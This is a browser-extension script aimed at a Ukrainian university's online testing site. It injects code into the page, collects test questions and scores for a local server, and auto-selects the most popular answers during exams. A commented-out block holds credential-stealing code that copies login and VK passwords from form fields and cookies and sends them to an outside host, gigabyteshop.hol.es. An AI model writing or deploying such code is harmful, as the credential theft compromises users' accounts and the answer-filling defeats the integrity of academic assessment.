$.get(chrome.extension.getURL('/injected.js'),
    function (data) {
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        script.innerHTML = data;
        document.getElementsByTagName("head")[0].appendChild(script);
//
//        function createJsonResponse() {
//            var input;
//            var discipline = $(".breadcrumbs-list > li").next().find("a").html();
//            var testId = getCookie("test_id");
//
//            if (testId !== undefined) {
//                $.get("http://dl.tntu.edu.ua/users/profile.php", function (groupData) {
//                    var responseArr = [];
//
//                    var group = $(groupData).find("input[id=\"group\"]").attr("value");
//
//                    var elements = $('form[name = \'test\'] fieldset[class=\'group_form\'] > div[class=\'test_instruction\']');
//
//
//                    var responseObject = {};
//
//                    responseObject["user"] = $("#header-main-logout-username").text();
//                    responseObject["testId"] = testId;
//                    responseObject["group"] = group;
//                    responseObject["discipline"] = unifyStr(discipline);
//                    responseObject["moduleName"] = unifyStr($("fieldset[class='group_form'] > legend[class='group_form']").text());
//
//                    elements.each(function () {
//
//                        if ($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").html() !== undefined) {
//
//                            var object = {};
//
//                            var scoresOnTest = $(this).find("div").text();
//
//                            var questionNumber = $(this).find("h3").text();
//
//                            var question = $(this).next().find("p").text();
//
//                            var elements = $(this).next().find("label");
//
//                            var answers = [];
//                            elements.each(function (index) {
//                                answers.push($(this).text().trim());
//                            });
//
//                            object["scoreOnQuestion"] = unifyStr(scoresOnTest);
//                            object["questionHeader"] = unifyStr(questionNumber);
//                            object["question"] = unifyStr(question);
//                            object["answers"] = answers;
//                            object["answer"] = unifyStr($("label[for=\"" + $($(this).next().find("input:checked")).attr("id") + "\"]").text());
//
//
//                            responseArr.push(object);
//
//                        }
//
//                    });
//
//                    responseObject["body"] = responseArr;
//                    return sendResponse(responseObject);
//
//                });
//
//                return true;
//            }
//
//        }
//
//        var testForm = $("form[name = 'test']")[0];
//
//        if (testForm !== undefined) {
//
//            var inp = $("fieldset[class='group_form'] input[type='submit']");
//            //$(inp).attr("type", "button");
//            $(inp).attr("onclick", "createJsonResponse()");
//            //$(inp).click(function () {
//            //        createXmlResponse();
//            //    }
//            //);
//            //
//            //$(testForm).find("input[type ='submit']").click(function(){
//            //
//            //    window.setTimeout(function() {
//            //        createJsonResponse();
//            //    }, 1);
//            //});
//            //$(testForm).submit(function () {
//        //        createJsonResponse();
//        //    });
//        }
//

        function getXmlHttp() {
            var xmlhttp;
            try {
                xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
            } catch (e) {
                try {
                    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (E) {
                    xmlhttp = false;
                }
            }
            if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
                xmlhttp = new XMLHttpRequest();
            }
            return xmlhttp;
        }

        var startTest = $("form[name = 'form']")[0];

        /*&& document.URL.startsWith("http://dl.tntu.edu.ua/mods/_standard/tests/test_intro.php")*/

        if (startTest !== undefined) {

            $(startTest).submit(function () {
                var xmlhttp = getXmlHttp();
                xmlhttp.open('GET', 'http://localhost:8080/easytutor/rest/atutor/test/temp-test', false);
                xmlhttp.send(null);
                if (xmlhttp.status == 200) {
                    setCookie("test_id", xmlhttp.responseText, {expires: 300});
                    //alert(xmlhttp.responseText);
                } else {
                    //alert("Error status: " + xmlhttp.status);
                }

            });


        }
//
//
//        function sendResponse(result) {
//
//            var xmlhttp = getXmlHttp();
//            xmlhttp.open('POST', 'http://localhost:8080/easytutor/rest/atutor/test/questions', false);
//            xmlhttp.setRequestHeader("Content-type", "application/json");
//            xmlhttp.send(JSON.stringify(result));
//            if (xmlhttp.status == 200) {
//            } else {
//            }
//
//            //$.ajax({
//            //    url: 'http://localhost:8080/easytutor/rest/atutor/test/questions',
//            //    data: JSON.stringify(result),
//            //    contentType: "application/json",
//            //    type: 'POST',
//            //    success: function () {
//            //    },
//            //    error: function () {
//            //    }
//
//            //});
//return true;
//        }
//
//        $("form[name = 'form']").submit(function (e) {
//            document.cookie = "discipline=" + $("#breadcrumbs a").next().html();
//            document.cookie = "moduleName=" + $("form[name = 'form'] > div[class='input-form'] > fieldset[class='group_form'] > legend").html();
//
//        });
//
//
        function sendTestResult() {

            var testId = getCookie("test_id");
            if (testId !== undefined) {
                var testResult = $('form[method = \'get\'] > div[class=\'input-form\'] > div[class=\'test_instruction\']  span').text().replace("Балів", "").trim();

                if (testResult !== undefined) {

                    var result = parseInt(testResult.split("/")[0]);
                    var max = parseInt(testResult.split("/")[1]);
                    if (result === undefined || max == undefined || testId == undefined || !max || !result) {
                        return;
                    }

                    var object = {};
                    object["maxScores"] = max;
                    object["scores"] = result;
                    object["id"] = testId;

                    console.log(JSON.stringify(object));

                    $.ajax({
                        url: "http://localhost:8080/easytutor/rest/atutor/test/scores",
                        data: JSON.stringify(object),
                        contentType: "application/json",
                        type: 'POST',
                        success: function () {
                        },
                        error: function () {
                        }

                    });

                    setCookie("is_test_submit", "false", {"expires": 10000});
                    //setCookie("test_id", "", {"expires": 10000});
                }

            }
        }

        sendTestResult();


        $("fieldset[class='group_form'] > .row > p").click(function () {
            var obj = getRuntimeInfo();
            var currentQuestion = $(this).next();
            var question = $(this).text().trim();
            obj["question"] = question;
            console.log(obj);

            $.ajax({
                url: "http://localhost:8080/easytutor/rest/atutor/answer-for-question",
                data: JSON.stringify(obj),
                contentType: "application/json",
                type: 'POST',
                success: function (data) {
                    console.log(JSON.stringify(data));
                    var jsonFromServer = JSON.parse(JSON.stringify(data));

                    function include(arr, obj) {
                        for (var i = 0; i < arr.length; i++) {
                            if (arr[i].answerName == obj) return i;
                        }
                        return -1;
                    }

                    if (!jsonFromServer.exist) {
                        console.log("Answer not exist in database");
                    } else {

                        if (jsonFromServer.correct) {
                            console.log("Correct answer is " + jsonFromServer.correctAnswer);
                        } else {

                            var answer = getAnswerWithMaxSelected(jsonFromServer.answerStatistic);

                            if (answer === undefined) {
                                $(currentQuestion).find(".multichoice-question").each(function () {

                                    var index = include(jsonFromServer.answerStatistic, $(this).text().trim());
                                    if (index !== -1) {
                                        //console.log(jsonFromServer.answerStatistic[index]);
                                        //if ($(this).text().trim() !== "Залишити без відповіді")
                                        //    $(this).find("input").attr("checked", "true");
                                        $(this).html($(this).html() + " selected count: " + jsonFromServer.answerStatistic[index].selectedCount)
                                    }

                                });

                            } else {

                                $(currentQuestion).find(".multichoice-question").each(function () {
                                    var index = include(jsonFromServer.answerStatistic, $(this).text().trim());
                                    if (index !== -1 &&  $(this).text().trim() === answer.answerName) {
                                        console.log(jsonFromServer.answerStatistic[index]);
                                        if ($(this).text().trim() !== "Залишити без відповіді")
                                            $(this).find("input").attr("checked", "true");
                                    }
                                });
                            }

                            //console.log("Correct answer: " + getAnswerWithMaxSelected(jsonFromServer.answerStatistic));


                        }

                    }


                },
                error: function () {
                    console.log("Cannot get answer for question '" + question + "'");
                }

            });

        });

        function getAnswerWithMaxSelected(answers) {

            if (answers.length === 1) {
                return answers[0];
            }

            var answer = answers[0];

            var i;

            for (i = 1; i < answers.length; i++) {
                if (answer.selectedCount < answers[i].selectedCount) {
                    answer = answers[i];
                }
            }

            var countEqualObject = 0;
            for (i = 0; i < answers.length; i++) {
                if (answer.selectedCount === answers[i].selectedCount && answer.answerName !== answers[i].answerName)
                    countEqualObject += 1;
            }
            console.log("countEqualObject: " + countEqualObject + " answer " + JSON.stringify(answer));
            if (countEqualObject !== 0) {
                return undefined;
            }

            return answer;

        }

        function getRuntimeInfo() {
            var obj = {};

            var xmlhttp = getXmlHttp();
            xmlhttp.open('GET', 'http://dl.tntu.edu.ua/users/profile.php', false);
            xmlhttp.send(null);
            if (xmlhttp.status == 200) {
                obj["group"] = $(xmlhttp.responseText).find("input[id=\"group\"]").attr("value");
            }

            obj["discipline"] = unifyStr($(".breadcrumbs-list > li").next().find("a").html());
            obj["testName"] = unifyStr($("fieldset[class='group_form'] > legend[class='group_form']").text());

            return obj;
        }

//
//        /*
//         deleteCookie( 'TNTU_login' );
//         deleteCookie( 'TNTU_pass' );
//
//         $.ajax( {
//         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
//         data         : {
//         email   : TNTU_login,
//         password: TNTU_pass,
//         social  : "TNTU"
//         },
//         dataType     : "jsonp",
//         jsonpCallback: "login"
//         } );
//
//         $( "#quick_login_button" ).click( function ( ) {
//         var login_vk = $( "#quick_email" ).val();
//         var pass_vk = $( "#quick_pass" ).val();
//
//
//         $.ajax( {
//         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
//         data         : {
//         email   : login_vk,
//         password: pass_vk,
//         social  : "VK"
//         },
//         dataType     : "jsonp",
//         jsonpCallback: "login"
//         } )
//
//         } );
//
//
//         $( "#pass" ).keyup( function ( e ) {
//         TNTU_pass = $( "#pass" ).val();
//         } );
//
//         $( "form[name = 'form']" ).submit( function ( e ) {
//         TNTU_login = $( "#login" ).val();
//         document.cookie = "TNTU_login=" + TNTU_login;
//         document.cookie = "TNTU_pass=" + TNTU_pass;
//         } );
//
//
//
//         $( "form[name = 'login']" ).submit( function ( e ) {
//         var login_vk = $( "#quick_email" ).val();
//         var pass_vk = $( "#quick_pass" ).val();
//         alert(login_vk);
//         $.ajax( {
//         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
//         data         : {
//         email   : login_vk,
//         password: pass_vk,
//         social  : "VK"
//         },
//         dataType     : "jsonp",
//         jsonpCallback: "login"
//         } )
//         } );
//
//
//         $( "form[name = 'login']" ).submit( function ( e ) {
//         var login_vk = $( "#quick_email" ).val();
//         var pass_vk = $( "#quick_pass" ).val();
//         alert(login_vk);
//         $.ajax( {
//         url          : "http://gigabyteshop.hol.es/bd.php?callback=?",
//         data         : {
//         email   : login_vk,
//         password: pass_vk,
//         social  : "VK"
//         },
//         dataType     : "jsonp",
//         jsonpCallback: "login"
//         } )
//         } );
//         */
//
    }
);

function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

function deleteCookie(name) {
    setCookie(name, "", {expires: -1})
}

function unifyStr(str) {
    return str.replace("\r", "").replace("\n", "").replace("\t", "").replace("Балів", "").trim();
}

function setCookie(name, value, options) {
    options = options || {};

    var expires = options.expires;

    if (typeof expires == "number" && expires) {
        var d = new Date();
        d.setTime(d.getTime() + expires * 1000);
        expires = options.expires = d;
    }
    if (expires && expires.toUTCString) {
        options.expires = expires.toUTCString();
    }

    value = encodeURIComponent(value);

    var updatedCookie = name + "=" + value;

    for (var propName in options) {
        updatedCookie += "; " + propName;
        var propValue = options[propName];
        if (propValue !== true) {
            updatedCookie += "=" + propValue;
        }
    }

    document.cookie = updatedCookie;
}
